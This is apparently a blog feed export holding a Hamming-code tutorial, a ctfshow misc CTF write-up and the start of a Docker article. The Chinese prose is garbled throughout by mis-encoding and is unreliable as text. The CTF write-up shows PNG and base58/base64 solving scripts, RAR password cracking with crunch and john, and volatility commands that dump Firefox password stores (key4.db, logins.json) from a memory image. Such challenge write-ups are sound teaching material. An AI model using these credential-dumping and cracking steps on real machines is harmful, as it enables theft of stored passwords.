<h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æš‚æ—¶å†™è¿™ä¹ˆå¤šå§ï¼Œä¹‹åå°±ä¸æ›´æ–°äº†ã€‚ä¸ªäººå»ºè®®è¿˜æ˜¯ä¸è¦åœ¨è¿™ä¸ªæ¨¡å—ä¸Šé¢èŠ±è´¹å¤ªå¤šç²¾åŠ›^_^</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>æ±‰æ˜ç è®¡ç®—</title>
    <url>/posts/bf9bf50c/</url>
    <content><![CDATA[<p>ç°åœ¨æœ‰ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼š<code>10110110111</code>ï¼Œæˆ‘ä»¬è¦è®¡ç®—å®ƒçš„å¥‡å¶æ ¡éªŒ</p>
<blockquote>
<p>æ±‰æ˜å…¬å¼ï¼š2^n &gt;&#x3D; x + n + 1 (nä¸ºæ ¡éªŒç ä½æ•° xä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ä½æ•°)</p>
</blockquote>
<blockquote>
<p>2^n &gt;&#x3D; 11 + n + 1</p>
</blockquote>
<p>æ‰€ä»¥å¾—åˆ°<code>n=4</code></p>
<blockquote>
<p>æ ¡éªŒç ä½ç½®ï¼š2^i(i&#x3D;0,1,2,â€¦,æ ¡éªŒç ä½æ•°-1)</p>
</blockquote>
<p>å¾—åˆ°æ ¡éªŒç çš„ä½ç½®ä¸º<code>1</code>ï¼Œ<code>2</code>ï¼Œ<code>4</code>ï¼Œ<code>8</code>,å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ—å‡ºä»¥ä¸‹è¡¨æ ¼ï¼ˆçº¢æ–¹æ¡†è¡¨ç¤ºæ ¡éªŒç ä½ç½®ï¼‰</p>
<p><img src="/img/linux/%E6%B1%89%E6%98%8E%E7%A0%81-1.png"></p>
<p>ç„¶åå°†éœ€è¦ç¼–ç çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²å¡«å…¥è¡¨æ ¼ä¸­<br><img src="/img/linux/%E6%B1%89%E6%98%8E%E7%A0%81-2.png"></p>
<p>æ¥ç€å°†åºå·ä¸­äºŒè¿›åˆ¶æ•°ç¬¬1ä½ï¼ˆä»å³å¾€å·¦æ•°ï¼‰ä¸º1ã€ç¬¬2ä½ä¸º1ã€ç¬¬3ä½ä¸º1ã€ç¬¬4ä½ä¸º1çš„åºå·ä»¥æ¬¡æ”¾å…¥ç¬¬1ã€2ã€3ã€4ç»„</p>
<blockquote>
<p>ç¬¬1ç»„ï¼š1(0011) 3(0011) 5(0101) 7(0111) 9(1001) 11(1011) 13(1101) 15(1111)<br>ç¬¬2ç»„ï¼š2(0100) 3(0011) 6(0110) 7(0111) 10(1010) 11(1011) 14(1110) 15(1111)<br>ç¬¬3ç»„ï¼š4(0100) 5(0101) 6(0110) 7(0111) 12(1100) 13(1101) 14(1110) 15(1111)<br>ç¬¬4ç»„ï¼š8(1000) 9(1001) 10(1010) 11(1011) 12(1100) 13(1101) 14(1110) 15(1111)</p>
</blockquote>
<p>åˆ†ç»„å®Œæˆåæˆ‘ä»¬å°±è®¡ç®—å‡ºæ¯ä¸€ç»„ä¸­åºå·å¯¹åº”çš„å€¼ä¸­æœ‰å‡ ä¸ª1</p>
<blockquote>
<p>ç¬¬1ç»„ï¼š5ä¸ª<br>ç¬¬2ç»„ï¼š4ä¸ª<br>ç¬¬3ç»„ï¼š5ä¸ª<br>ç¬¬4ç»„ï¼š5ä¸ª</p>
</blockquote>
<p>æ ¹æ®æ¯ç»„å½“ä¸­1çš„ä¸ªæ•°ï¼Œæˆ‘ä»¬å°±èƒ½è®¡ç®—å‡ºæ ¡éªŒç çš„å€¼ï¼Œè‹¥ä¸ºå¥‡æ ¡éªŒï¼Œåˆ™æ ¡éªŒç ä¸º0010ï¼›è‹¥ä¸ºå¶æ ¡éªŒï¼Œåˆ™æ ¡éªŒç ä¸º1101<br>ç¼–ç åçš„ç»“æœå¦‚ä¸‹</p>
<blockquote>
<p>å¥‡æ ¡éªŒï¼š101101100110110<br>å¶æ ¡éªŒï¼š101101110111101</p>
</blockquote>
<p><a href="http://migooli.top/2021/09/21/ctfshow_2021%E6%9C%88%E9%A5%BC%E6%9D%AF%E8%AE%B0%E5%BD%95/">å‚è€ƒæ–‡ç« </a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>æ±‰æ˜ç </tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘åƒé¸¡æ¯-misc-wp</title>
    <url>/posts/81e3f8e/</url>
    <content><![CDATA[<h1 id="Fortune-Cookie"><a href="#Fortune-Cookie" class="headerlink" title="Fortune Cookie"></a>Fortune Cookie</h1><p>åŠ¨æ€çš„miscé¢˜ç›®,ç¬¬ä¸€æ¬¡è§ï¼ŒæŒºæœ‰æ–°æ„çš„<br>å›¾ç‰‡ä¸‹è½½åå‘ç°æ˜¯pngå›¾ç‰‡ï¼Œé‚£ä¹ˆå°±ç”¨tweakpngå…ˆæŸ¥çœ‹crc<br>æŠ¥é”™äº†ï¼Œä½†æ˜¯å›¾ç‰‡èƒ½æ‰“å¼€ï¼Œæ‰€ä»¥æ˜¯å›¾ç‰‡çš„å®½é«˜è¢«æ”¹å˜äº†<br><img src="/img/ctfshow/cjb1.png"><br>ç”¨è„šæœ¬çˆ†ç ´å›¾ç‰‡çš„å®½é«˜</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><br>m = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>    <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5000</span>):<br>        c = m[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc = binascii.crc32(c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc == <span class="hljs-number">0x91918666</span>:       //crc<br>            k = <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
<p>å°†å›¾ç‰‡çš„å®½é«˜ä¿®æ”¹ä¸ºçˆ†ç ´å‡ºæ¥çš„å€¼<br><img src="/img/ctfshow/cjb2.png"><br>ä¿®æ”¹åå†æ¬¡ç”¨tweakpngæŸ¥çœ‹å›¾ç‰‡çš„idatå—<br>å‘ç°ç¬¬ä¸€ä¸ªidatå—å¾ˆå°ï¼Œå°†è¿™ä¸ªå—åˆ é™¤<br><img src="/img/ctfshow/cjb3.png"><br>å¾—åˆ°åŸå§‹å›¾ç‰‡(æ”¾ä¸ªå°å›¾ï¼Œå˜¿å˜¿å˜¿ï¼Œå®Œæ•´çš„å¤§å®¶è‡ªå·±åšè¯•è¯•å§)<br><img src="/img/ctfshow/cjb4.png"><br>ç”¨stegsolveæŸ¥çœ‹ï¼Œä¼šå‘ç°3ä¸ªé¢œè‰²é€šé“çš„0é€šé“æœ‰â€å¼‚å¸¸â€,ä¿å­˜ä¸‹æ¥<br>ä»”ç»†è§‚å¯Ÿï¼Œä¼šå‘ç°å·¦ä¸Šè§’å­˜åœ¨æœ‰è§„å¾‹çš„åç§»<br><img src="/img/ctfshow/cjb5.png"><br>ç”¨stegsolveçš„stereogram solveråŠŸèƒ½è¿›è¡Œåç§»<br>å½“åç§»åˆ°20çš„æ—¶å€™å‡ºç°äº†æ–‡å­—ä¿¡æ¯ï¼Œæç¤ºå·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬æ¢ä¸ªæ–¹å‘å†æ¬¡è¿›è¡Œåç§»<br><img src="/img/ctfshow/cjb6.png"><br>æˆ‘åœ¨åç§»é‡ä¸º187çš„æ—¶å€™å¾—åˆ°äº†flag</p>
<h1 id="zipper-clipper-not-need-john-the-ripper"><a href="#zipper-clipper-not-need-john-the-ripper" class="headerlink" title="zipper, clipper, not need john the ripper"></a>zipper, clipper, not need john the ripper</h1><p>å‘ç°åœ¨windowsä¸‹å’Œlinuxä¸‹è§£å‹çš„å†…å®¹ä¸ä¸€æ ·<br>å› ä¸ºwindowsä¸‹çš„æ–‡ä»¶å¤¹åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè§£å‹åä¼šåˆå¹¶<br><img src="/img/ctfshow/cjb17.png"></p>
<p>è§£å‹åå…±æœ‰58ä¸ªï¼ŒçŒœæµ‹æ˜¯base58<br>ç”¨è„šæœ¬è§£ï¼Œæ³¨æ„æœ‰å‡ ä¸ªå­—æ¯æ˜¯æ²¡æœ‰çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,base58<br><br>text = [<span class="hljs-string">&#x27;&#x27;</span>] * <span class="hljs-number">1000</span><br>dic = <span class="hljs-string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    numlist = os.listdir(<span class="hljs-string">f&#x27;./file/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> numlist:<br>        text[<span class="hljs-built_in">int</span>(j)] = i<br><br>t = base58.b58decode(<span class="hljs-string">&#x27;&#x27;</span>.join(text).encode()).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span> + t.split(<span class="hljs-string">&#x27;&#123;&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;&#125;&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªflagä¹Ÿæ˜¯åŠ¨æ€çš„<br><img src="/img/ctfshow/cjb18.png"></p>
<h1 id="mumuziçš„ç…§ç‰‡"><a href="#mumuziçš„ç…§ç‰‡" class="headerlink" title="mumuziçš„ç…§ç‰‡"></a>mumuziçš„ç…§ç‰‡</h1><p>æ ¹æ®hint.pngï¼Œé¦–å…ˆçˆ†ç ´base64ç¼–ç è¡¨<br>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;im_not_tao_god.txt.encode&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    a=f.read()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;im_not_tao_god.txt&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-keyword">as</span> b:<br>    b=base64.b64encode(b.read()).decode()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;mumuzi.rar.encode&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    timu=f.read()<br><br>l=<span class="hljs-string">&#x27;&#x27;</span><br>k=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-keyword">if</span> a[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> l:<br>        l=l+a[i]<br>        k=k+b[i]<br><br>d=&#123;&#125;<br>x=string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="hljs-string">&quot;+/=&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(k)):<br>    d[l[i]]=k[i]<br>yuanwen=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> l:<br>        yuanwen=yuanwen+i<br><br><br>miwen=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> k:<br>       miwen=miwen+i<br><span class="hljs-built_in">print</span>(yuanwen,miwen)<br><br><span class="hljs-keyword">for</span> order <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(permutations(miwen,<span class="hljs-number">4</span>)):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(yuanwen)):<br>        d[yuanwen[i]]=order[i]<br>    s=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> timu:<br>        s=s+d[j]<br>    bs=base64.b64decode(s)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output\\&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join(order)+<span class="hljs-string">&#x27;.rar&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        f.write(bs)<br></code></pre></td></tr></table></figure>
<p>çˆ†ç ´åå¾—åˆ°ä¸€ä¸ªçœŸçš„å‹ç¼©åŒ…ï¼Œå…¶ä»–çš„å‹ç¼©åŒ…æ˜¯åçš„<br><img src="/img/ctfshow/cjb19.png"><br>è§£å‹åå¾—åˆ°ä¸€ä¸ªhelloworld.txtå’Œflag.rar<br>åœ¨hint.pngä¸­å¯ä»¥å¾—åˆ°flag.rar çš„å¯†ç èŒƒå›´æ˜¯0-1234<br><img src="/img/ctfshow/cjb20.png"><br>ç”¨shellè„šæœ¬çˆ†ç ´<br>å…ˆç”Ÿæˆå¯†ç å­—å…¸ï¼Œå¯ä»¥ç”¨crunchå‘½ä»¤</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">crunch</span> <span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">0123456789</span>  &gt;&gt; passwd.txt<br></code></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">while</span> [ -f <span class="hljs-string">&quot;rars/flag.rar&quot;</span> ]<br><span class="hljs-keyword">do</span><br>	mv .<span class="hljs-regexp">/rars/</span>flag.rar .<span class="hljs-regexp">/rars/</span>flag_.rar<br>	rar2john .<span class="hljs-regexp">/rars/</span>flag_.rar &gt;hash.txt<br>	john hash.txt --wordlist=passwd.txt<br>	password=`john hash.txt --show|head -n1|cut -d<span class="hljs-string">&quot;:&quot;</span> -f <span class="hljs-number">2</span>`<br>	unrar e -o+ .<span class="hljs-regexp">/rars/</span>flag_.rar .<span class="hljs-regexp">/rars/</span> -p<span class="hljs-variable">$&#123;password&#125;</span><br>done<br></code></pre></td></tr></table></figure>
<p>çˆ†ç ´äº†å¤§æ¦‚ä¸€ä¸ªå°æ—¶ã€‚ã€‚ã€‚ç»“æœè¿˜æ˜¯å‡çš„<br>æœ€åå¾—åˆ°çš„txtæ–‡ä»¶é‡Œå†™ç€ï¼šflagä¸åœ¨è¿™é‡Œï¼Œä½ å¾—å¾€å›èµ°ã€‚<br><img src="/img/ctfshow/cjb22.png"></p>
<p>è§‚å¯Ÿæœ€åçš„flag.rarå¾—çŸ¥raræ–‡ä»¶æ˜¯æœ‰æ³¨é‡Šçš„å°†æ‰€æœ‰æ³¨é‡Šæå–å‡ºæ¥</p>
<p>æ ¹æ®txtçš„æç¤ºï¼Œflagå¾—å¾€å›èµ°ï¼Œè§‚å¯Ÿæœ€åä¸€æ®µæ³¨é‡Šï¼Œå‘ç°æ˜¯pngæ–‡ä»¶å¤´åè¿‡æ¥ï¼Œå°†æ‰€æœ‰æ³¨é‡Šè¿åœ¨ä¸€èµ·ç„¶åreverseï¼Œå¾—åˆ°pngæ–‡ä»¶</p>
<p>ç”¨010æ‰“å¼€å›¾ç‰‡ï¼ŒCRCæŠ¥é”™è¯´æ˜å®½é«˜è¢«æ”¹è¿‡äº†ï¼Œçˆ†ç ´å‡ºæ­£ç¡®çš„å®½åº¦ç„¶åbinwalkå¯ä»¥å‘ç°æç¤ºï¼šæˆ‘å°±çŸ¥é“ä½ ä»¬åªå–œæ¬¢loliä¸å–œæ¬¢æˆ‘ï¼Œæˆ‘éƒ½ç©¿æˆè¿™æ ·äº†ä½ è¿˜ä¸çŸ¥é“è¯¥å¯¹æˆ‘ï¼ˆpngï¼Œç»å¯¹ä¸æ˜¯mumuziï¼‰åšä»€ä¹ˆä¹ˆï¼Ÿ</p>
<p>è¯´æ˜æ˜¯brainfuckçš„brainlolleræ¨¡å¼ï¼Œç›´æ¥bftoolsä¸€ä¸‹è¿™ä¸ªå›¾ç‰‡å°±å‡ºæ¥äº†bftools.exe decode brainloller mumuzi.pngå¾—åˆ°flag</p>
<h1 id="ç«çƒ¤å¤§ç‰›1-0"><a href="#ç«çƒ¤å¤§ç‰›1-0" class="headerlink" title="ç«çƒ¤å¤§ç‰›1.0"></a>ç«çƒ¤å¤§ç‰›1.0</h1><p>è¡¥ä¸ŠPLTEå’Œä¿®æ”¹å®½é«˜å³å¯</p>
<h1 id="ä¿¡å®ˆç€æ‰¿è¯º"><a href="#ä¿¡å®ˆç€æ‰¿è¯º" class="headerlink" title="ä¿¡å®ˆç€æ‰¿è¯º"></a>ä¿¡å®ˆç€æ‰¿è¯º</h1><p>æ ¹æ®æç¤ºæ‰¾åˆ°ä¸€ä¸ªä¿¡æ¯</p>
<blockquote>
<p>ä¿¡å®ˆç€æ‰¿è¯º</p>
</blockquote>
<p><img src="/img/ctfshow/cjb12.png"></p>
<p>åœ¨æ–‡ä»¶ä¸­å‘ç°zipç»“æ„ï¼Œç”¨foremoståˆ†ç¦»åå‘ç°ä¸€ä¸ªå¸¦å¯†ç çš„å‹ç¼©åŒ…<br>ç”¨æ­Œè¯æˆåŠŸè§£å‹<br>ç»“å°¾å¤„æœ‰ä¸€ä¸²base64åŠ å¯†çš„å­—ç¬¦ä¸²<br>è§£å¯†åå°±æ˜¯flag<br><img src="/img/ctfshow/cjb13.png"></p>
<h1 id="åœ¨ï¼Ÿçœ‹çœ‹å¯†ç "><a href="#åœ¨ï¼Ÿçœ‹çœ‹å¯†ç " class="headerlink" title="åœ¨ï¼Ÿçœ‹çœ‹å¯†ç "></a>åœ¨ï¼Ÿçœ‹çœ‹å¯†ç </h1><p>éé¢„æœŸè§£<br>ç›´æ¥å¯ä»¥æ‰¾åˆ°flag<br><img src="/img/ctfshow/cjb8.png"></p>
<p>é¢„æœŸè§£<br>åˆ©ç”¨volatility<br>å…ˆimageinfoå’Œpsliståˆ†æ<br><img src="/img/ctfshow/cjb9.png"><br>ç„¶åå°±æ˜¯æ‰¾å¯†ç äº†<br>å› ä¸ºfirefoxçš„å¯†ç ç®¡ç†å™¨dbå’Œjsonæ–‡ä»¶å­˜æ”¾åœ¨Roaming\Mozilla\Firefox\profiles\xxxxxxx.default\key4.dbå’Œlogins.jsonã€‚æ‰€ä»¥ç›´æ¥æ‰¾è¿™ä¸¤ä¸ªï¼Œç„¶åç”¨githubçš„firefoxå¯†ç æŸ¥çœ‹å™¨è„šæœ¬æˆ–è€…ç”¨è½¯ä»¶å³å¯</p>
<blockquote>
<p>å…ˆæŸ¥çœ‹åœ¨ä¸‹è½½<br>volatility -f looklookpassword.vmem â€“profile&#x3D;Win7SP1x64 filescan |grep â€˜key4.dbâ€™<br>volatility -f looklookpassword.vmem â€“profile&#x3D;Win7SP1x64 filescan |grep â€˜logins.jsonâ€™<br>volatility -f looklookpassword.vmem â€“profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003d6ab4b0 -D .&#x2F;<br>volatility -f looklookpassword.vmem â€“profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003ec70d00 -D .&#x2F;</p>
</blockquote>
<p><img src="/img/ctfshow/cjb10.png"><br>æ‹¿åˆ°flag<br><img src="/img/ctfshow/cjb11.png"></p>
<h1 id="qcode"><a href="#qcode" class="headerlink" title="qcode"></a>qcode</h1><p>è§£å‹å¾—åˆ°å¾ˆå¤šä¸ªäºŒç»´ç å›¾ç‰‡<br>ä½¿ç”¨è„šæœ¬æ‰¹é‡æ‰«æ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyzbar.pyzbar <span class="hljs-keyword">as</span> pyzbar<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br>path = <span class="hljs-string">&#x27;C:\\Users\\username\\Desktop\\qcode&#x27;</span><br>texts = [<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">9424</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">9424</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(path):<br>    <span class="hljs-built_in">list</span>[i] = filename<br>    i += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç›®å½•æ–‡ä»¶è·å–å®Œæ¯•&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>))):<br>    img = Image.<span class="hljs-built_in">open</span>(path +<span class="hljs-string">&#x27;\\&#x27;</span>+ <span class="hljs-built_in">list</span>[i])<br>    texts[i] = pyzbar.decode(img)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å›¾åƒä¿¡æ¯è·å–å®Œæ¯•&#x27;</span>)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(texts)):<br>    <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> texts[j]:<br>        tmp = text.data.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span> <span class="hljs-keyword">in</span> tmp):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;äºŒç»´ç  &#x27;</span> + <span class="hljs-built_in">list</span>[j] + <span class="hljs-string">&#x27; è§£ç å‡ºctfshowï¼š&#x27;</span> + tmp)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> tmp):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;äºŒç»´ç  &#x27;</span> + <span class="hljs-built_in">list</span>[j] + <span class="hljs-string">&#x27; è§£ç å‡ºflagï¼š&#x27;</span> + tmp)<br><br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸€ä¸ªå‡çš„flag<br><img src="/img/ctfshow/cjb14.png"><br>å‘ç°è¿™å¼ å›¾ç‰‡ä¸­è¿˜å¸¦æœ‰zip<br>ç”¨binwalkæˆ–foremoståˆ†ç¦»å‡ºæ¥<br>è§£å‹åæœ‰flaag.txtå’Œglbä¸¤ä¸ªæ–‡ä»¶<br><a href="https://jingyan.baidu.com/article/3aed632e7634b731108091cf.html">æ‰“å¼€glbæ–‡ä»¶çš„ç™¾åº¦ç»éªŒ</a><br>æ”¹åä¸º1.glbæ‰“å¼€<br><img src="/img/ctfshow/cjb15.png"><br>å¾—åˆ°ä¸¤ä¸²å­—ç¬¦</p>
<blockquote>
<p>The key:12</p>
</blockquote>
<blockquote>
<p>First kaisa second fence key</p>
</blockquote>
<p>æ‰“å¼€flaag.txt<br>å¼€å¤´æ˜¯ä¸€ä¸ªå‡çš„flag<br>åé¢æ˜¯å¤§é‡çš„255ï¼Œç”¨è„šæœ¬è¿›è¡Œç”»å›¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>))<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flaag.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(f)):<br>    s = f[i].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>        <span class="hljs-keyword">if</span>(s[j] == <span class="hljs-string">&#x27;255&#x27;</span>):<br>            pic.putpixel((j,i),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">elif</span> s[j].find(<span class="hljs-string">&#x27;\n&#x27;</span>)&gt;<span class="hljs-number">0</span>:<br>            pic.putpixel((j,i),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">else</span>:<br>            pic.putpixel((j,i),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>pic.save(<span class="hljs-string">&quot;qcode.png&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>å¾—åˆ°è¿™æ ·ä¸€å¼ å›¾ç‰‡<br><img src="/img/ctfshow/cjb16.png"><br>ç„¶åæ ¹æ®key<br>å…ˆ<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">å‡¯æ’’12</a>ï¼Œå†<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">æ …æ 12</a>å³å¯å¾—åˆ°flag</p>
<blockquote>
<p>od0dfmz_rf_Begfdtxtaam1nifex{u_qOaIy0zm}zefs_q<br>cr0rtan_ft_Psutrhlhooa1bwtsl{i_eCoWm0na}nstg_e     å‡¯æ’’12<br>ctfshow{C0ngratulations_0n_th1s_Water_Problem}     æ …æ 12</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>å®¹å™¨ç¼–æ’åŠç¯å¢ƒéƒ¨ç½²</title>
    <url>/posts/145ae3c2/</url>
    <content><![CDATA[<h1 id="Dockerfileå’Œdocker-compose-ymlçš„åŒºåˆ«"><a href="#Dockerfileå’Œdocker-compose-ymlçš„åŒºåˆ«" class="headerlink" title="Dockerfileå’Œdocker-compose.ymlçš„åŒºåˆ«"></a>Dockerfileå’Œdocker-compose.ymlçš„åŒºåˆ«</h1><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfileæ˜¯ä¸€ä¸ªæŒ‰ä¸€å®šè§„åˆ™ç¼–å†™çš„åŒ…å«å¤šè¡Œå‘½ä»¤çš„æ–‡ä»¶ï¼Œä½¿ç”¨Dockerfileå¯ä»¥å¿«é€Ÿçš„æ„å»ºä¸€ä¸ªå®šåˆ¶çš„é•œåƒã€‚</p>
<h2 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h2><p>ä½¿ç”¨docker-compose.yamlæ–‡ä»¶ï¼ŒæŒ‰ç…§ç‰¹å®šçš„è¯­æ³•è¯­å¥ç¼–å†™æŒ‡ä»¤ï¼Œç®¡ç†å¤šä¸ªé•œåƒçš„éƒ¨ç½²å’Œç«¯å£ç­‰æ“ä½œï¼Œå®ç°çœŸè¯çš„å¿«é€Ÿéƒ¨ç½²ã€‚åœ¨ä¸åŒæœåŠ¡å™¨ä¸Šéƒ¨ç½²æ—¶ï¼Œåªéœ€è¦ä¸€ä¸ªdocker-compose.yamlæ–‡ä»¶ï¼Œä¾¿èƒ½å®Œæˆåº”ç”¨çš„éƒ¨ç½²æ“ä½œã€‚æ€»ä¹‹ï¼ŒDocker Composeæ˜¯ç”¨æ¥ç®¡ç†å¤šä¸ªå®¹å™¨çš„ã€‚</p>
